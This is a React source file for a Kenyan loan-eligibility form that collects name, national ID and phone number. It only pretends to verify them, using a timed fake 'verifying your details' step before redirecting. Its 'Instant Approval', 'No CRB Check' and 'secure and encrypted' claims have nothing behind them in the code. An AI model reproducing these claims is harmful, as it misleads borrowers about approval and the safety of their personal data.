import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import Swal from "sweetalert2";

const LoanEligibility = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    fullName: "",
    idNumber: "",
    phoneNumber: "",
    loanType: ""
  });
  const [isLoading, setIsLoading] = useState(false);

  // Validation regex patterns
  const nameRegex = /^[a-zA-Z\s.'-]{2,}$/;
  const phoneRegex = /^(?:\+?254|0)[17]\d{8}$/;
  const idRegex = /^\d{7,10}$/;

  // Load stored data if available
  useEffect(() => {
    const storedData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
    if (storedData) {
      setFormData(prev => ({
        ...prev,
        fullName: storedData.name || storedData.fullName || "",
        idNumber: storedData.id_number || storedData.idNumber || "",
        phoneNumber: storedData.phone_number || storedData.phoneNumber || "",
        loanType: storedData.loan_type || storedData.loanType || ""
      }));
    }
  }, []);

  const handleInputChange = (e) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id]: value
    }));
  };

  const checkLoanEligibility = () => {
    // Validation
    if (!formData.fullName || !formData.idNumber || !formData.phoneNumber || !formData.loanType) {
      Swal.fire('Missing Information', 'Please fill in all required fields before checking your loan eligibility.', 'error');
      return;
    }
    
    if (!nameRegex.test(formData.fullName.trim())) {
      Swal.fire('Invalid Name', 'Please enter your full name (letters only)', 'error');
      return;
    }
    
    if (!phoneRegex.test(formData.phoneNumber.trim())) {
      Swal.fire('Invalid Phone', 'Please enter a valid Safaricom number (07XXXXXXXX)', 'error');
      return;
    }
    
    if (!idRegex.test(formData.idNumber.trim())) {
      Swal.fire('Invalid ID', 'Please enter a valid Kenyan ID (7-10 digits)', 'error');
      return;
    }

    // Store data
    const userData = {
      name: formData.fullName.trim(),
      fullName: formData.fullName.trim(),
      id_number: formData.idNumber.trim(),
      idNumber: formData.idNumber.trim(),
      phone_number: formData.phoneNumber.trim(),
      phoneNumber: formData.phoneNumber.trim(),
      loan_type: formData.loanType,
      loanType: formData.loanType
    };
    
    sessionStorage.setItem('myLoan', JSON.stringify(userData));

    // Show loading
    setIsLoading(true);
    Swal.fire({
      title: 'Checking Eligibility',
      html: "We're verifying your details...",
      allowOutsideClick: false,
      didOpen: () => Swal.showLoading()
    });

    // Simulate API check
    setTimeout(() => {
      Swal.close();
      setIsLoading(false);
      
      // Navigate to loan application page
      navigate("/apply-loan");
    }, 2500);
  };

  return (
    <div>
      {/* Checker Section */}
      <section className="checker-section" id="checker">
        <div className="container">
          <div className="section-title">
            <h2>Check Your Loan Eligibility</h2>
            <p>Find out how much you qualify for instantly. No CRB check required.</p>
          </div>
          
          <div className="checker-form">
            <div className="form-group">
              <label htmlFor="fullName">Full Name *</label>
              <input 
                type="text" 
                id="fullName" 
                className="form-control" 
                placeholder="Enter your full name as per ID"
                value={formData.fullName}
                onChange={handleInputChange}
              />
            </div>
            
            <div className="form-row">
              <div className="form-group">
                <label htmlFor="idNumber">National ID Number *</label>
                <input 
                  type="text" 
                  id="idNumber" 
                  className="form-control" 
                  placeholder="Enter your ID Number"
                  value={formData.idNumber}
                  onChange={handleInputChange}
                />
              </div>
              <div className="form-group">
                <label htmlFor="phoneNumber">Phone Number *</label>
                <input 
                  type="text" 
                  id="phoneNumber" 
                  className="form-control" 
                  placeholder="e.g., 0712 345 678"
                  value={formData.phoneNumber}
                  onChange={handleInputChange}
                />
              </div>
            </div>
            
            <div className="form-group">
              <label htmlFor="loanType">Loan Purpose *</label>
              <select 
                id="loanType" 
                className="form-control"
                value={formData.loanType}
                onChange={handleInputChange}
              >
                <option value="">Select Loan Purpose</option>
                <option value="Business Loan">Business Loan</option>
                <option value="Personal Loan">Personal Loan</option>
                <option value="Education Loan">Education Loan</option>
                <option value="Medical Loan">Medical Loan</option>
                <option value="Emergency Loan">Emergency Loan</option>
              </select>
            </div>

            <div className="trust-info">
              <div className="trust-badge">
                <i className="fas fa-lock"></i> Secure Application
              </div>
              <div className="trust-badge">
                <i className="fas fa-user-shield"></i> No CRB Check
              </div>
              <div className="trust-badge">
                <i className="fas fa-bolt"></i> Instant Approval
              </div>
            </div>
            
            <div className="form-footer">
              <div className="disclaimer">
                <i className="fas fa-lock"></i> Your information is secure and encrypted.
              </div>
              <button 
                className="btn btn-primary" 
                onClick={checkLoanEligibility}
                disabled={isLoading}
              >
                {isLoading ? (
                  <>Checking Eligibility <i className="fas fa-spinner fa-spin"></i></>
                ) : (
                  <>Check Eligibility <i className="fas fa-search"></i></>
                )}
              </button>
            </div>
          </div>
        </div>
      </section>
      
      {/* Add some inline styles for the trust badges */}
      <style jsx>{`
        .trust-info {
          display: flex;
          justify-content: center;
          gap: 15px;
          margin: 25px 0;
          flex-wrap: wrap;
        }
        
        .trust-badge {
          background: #f8f9fa;
          padding: 10px 15px;
          border-radius: 20px;
          font-size: 14px;
          display: flex;
          align-items: center;
          gap: 8px;
          color: #059669;
          border: 1px solid rgba(5, 150, 105, 0.2);
        }
        
        .trust-badge i {
          font-size: 14px;
        }
        
        @media (max-width: 768px) {
          .trust-info {
            gap: 10px;
          }
          
          .trust-badge {
            padding: 8px 12px;
            font-size: 12px;
          }
        }
      `}</style>
    </div>
  );
};

export default LoanEligibility;